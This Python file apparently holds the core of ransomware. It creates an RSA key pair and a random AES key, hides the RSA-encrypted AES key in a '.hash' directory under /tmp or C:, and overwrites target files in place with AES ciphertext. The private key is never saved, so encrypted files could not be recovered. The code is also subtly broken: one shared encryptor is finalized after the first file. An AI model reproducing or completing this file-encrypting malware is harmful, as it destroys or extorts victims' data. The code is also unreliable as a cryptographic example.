from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import sys

# Generate RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Serialize public key for encryption
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
aes_key = os.urandom(32)  # 256-bit key for AES-256

def createTempDirectory():
    path = Path("/tmp/.hash/")
    path_key = Path("/tmp/.hash/encrypted_aes_key.bin")
    if path.exists():
        return 1
    else:
        if sys.platform == "linux":
            os.mkdir("/tmp/.hash/")
            saveEncryptedKey("linux")
        else:
            os.mkdir("C:/.hash/")
            saveEncryptedKey("win32")
        return 0

def saveEncryptedKey(platform):
    ciphertext = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    if platform == "linux":
        # Save the encrypted AES key to a file
        with open('/tmp/.hash/encrypted_aes_key.bin', 'wb') as f:
            f.write(ciphertext)
    else:
        # Save the encrypted AES key to a file
        with open('C:/.hash/encrypted_aes_key.bin', 'wb') as f:
            f.write(ciphertext)



iv = os.urandom(16)  # Initialization vector for AES encryption

cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
encryptor = cipher.encryptor()

plaintext = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
decryptor = plaintext.decryptor()


def EncryptFile(path):
    with open(path, 'rb') as f_in:
        plaintext = f_in.read()

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    # Save the encrypted data to a file
    with open(path, 'wb') as f_out:
        f_out.write(ciphertext)

def DecryptFile(path):
    with open(path, 'rb') as f_in:
        cipher = f_in.read()

    plaintext = decryptor.update(cipher) + decryptor.finalize()

    # Save the encrypted data to a file
    with open(path, 'wb') as f_out:
        f_out.write(plaintext)

